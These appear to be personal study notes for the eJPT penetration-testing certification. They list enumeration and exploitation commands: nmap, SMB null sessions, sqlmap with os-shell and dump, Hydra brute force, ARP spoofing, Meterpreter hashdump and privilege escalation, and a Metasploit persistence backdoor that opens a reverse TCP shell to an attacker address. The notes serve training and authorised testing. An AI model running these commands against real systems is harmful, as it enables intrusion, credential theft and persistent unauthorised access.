# eJPT notes

## Routing

`ip route add ROUTETO via ROUTEFROM`  


## Enumeration

### whois

`whois site.com`

### Ping sweep

`fping -a -g 10.10.10.0/24 2>/dev/null  
nmap -sn 10.10.10.0/24`

### Nmap

```bash
# OS Detection, no ping
nmap -Pn -O 10.10.10.10

# def scripts, version check
nmap -sC -sV 10.10.10.10

# above + All ports
nmap -sC -sV -p- 10.10.10.10

# UDP version check
nmap -sU -sV 10.10.10.10
```

### SMB/SAMBA

#### nbtscan

```text
nbtscan -A 10.10.10.10
```

![](../.gitbook/assets/image%20%2863%29.png)

#### net view

```text
net view 10.10.10.10
```

#### net use

```c
# c$ - shares in c drive
# admin$ - windows install directory
# ipc$ - inter process use (not viewable on browser)

# using no user/pass login

net use \\10.10.10.10\IPC$ '' /u:''
# The command completed successfully.

net use \\10.10.10.10\ADMIN$ '' /u:
# System error 5 has occurred.

# Access is denied.
```

#### enum

```bash
# enumerate users
enum -U 10.10.10.10

# enumerate password policy
enum -P 10.10.10.10
```

#### nmblookup

```text
nmblookup -A 10.10.10.10
```

#### smbclient

```bash
# no password mode -N
smbclient -L //10.10.10.10 -N
```

## Web Pentesting

### Banner Grabbing

```bash
nc -v 10.10.10.10 port
HEAD / HTTP/1.0
```

### OpenSSL for HTTPS services

```bash
openssl s_client -connect 10.10.10.10:443
HEAD / HTTP/1.0
```

### Httprint

`httprint -P0 -h 10.10.10.10 -s /path/to/signaturefile.txt`

### HTTP Verbs

`GET, POST, HEAD, PUT, DELETE, OPTIONS`

### PUT shells

```bash
wc -m shell.php
x shell.php

PUT /shell.php
Content-type: text/html
Content-length: x
```

### Directory and File Scanning

```bash
dirsearch.py -u http://10.10.10.10 -e *
gobuster -u 10.10.10.10 -w /path/to/wordlist.txt
```

### Google-fu

```text
site:
intitle:
inurl:
filetype:
AND, OR, &, |, -
```

### SQLMap

```bash
sqlmap -u http://10.10.10.10 -p parameter
sqlmap -u http://10.10.10.10  --data POSTstring -p parameter
sqlmap -u http://10.10.10.10 --os-shell
sqlmap -u http://10.10.10.10 --dump

# banner grabbing
sqlmap -u http://10.10.10.10/view.php?id=1 -b

# dump specified database
sqlmap -u http://10.10.10.10/view.php?id=1 --current-db selfie4you --dump


```



## Exploitation

### Unshadow

This prepares a file for use with John the Ripper `unshadow passwd shadow > unshadow`

### John The Ripper

`john -wordlist /path/to/wordlist -users=users.txt hashfile`

### Hydra

```bash
hydra -L users.txt -P pass.txt -t 10 10.10.10.10 ssh -s 22
hydra -L users.txt -P pass.txt telnet://10.10.10.10
```

### SMB / SAMBA

```bash
nmblookup -A 10.10.10.10
smbclient -L //10.10.10.10 -N (list shares)
smbclient //10.10.10.10/share -N (mount share)
enum4linux -a 10.10.10.10
```

### ARP spoofing \(Dsniff\)

```bash
# tells my machine to forward packets incepted to the real desination hosts
echo 1 > /proc/sys/net/ipv4/ip_forward

# arpspoof -i <interface> -t <target> -r <host>
arpspoof -i tap0 -t 10.10.10.10 -r 10.10.10.11
```

### Metasploit

```bash
search x
use x
info
show options
show advanced
```

#### Meterpreter

```bash
background
sessions -l
sessions -i 1
sysinfo
ifconfig
route

# get which user is running process
getuid

# privilege escalation ('User Account Control' GPO policy may prevent this)
getsystem

# bypass the restriction of 'User Account Control' GPO policy to privesc
bypassuac

# transfering files
download x /root/
upload x C:\\Windows

# run standard operating system shell
shell


use post/windows/gather/hashdump
```

#### Meterpreter - persistence backdoor

```bash
# persistent backdoor - need meterpreter session
msf > use exploit/windows/local/s4u_persistence
msf (s4u_persistence) > set session 2
#session => 2
msf (s4u_persistence) > set trigger logon
#trigger => logon
msf (s4u_persistence) > set payload windows/meterpreter/reverse_tcp
msf (s4u_persistence) > set lhost 1.2.3.4
msf (s4u_persistence) > set lport 1234
msf (s4u_persistence) > exploit


msf (s4u_persistence) > use exploit/multi/handler
msf (handler) > set payload windows/meterpreter/reverse_tcp
msf (handler) > exploit

# once victim restarts and logons, we will get a meterpreter shell
```

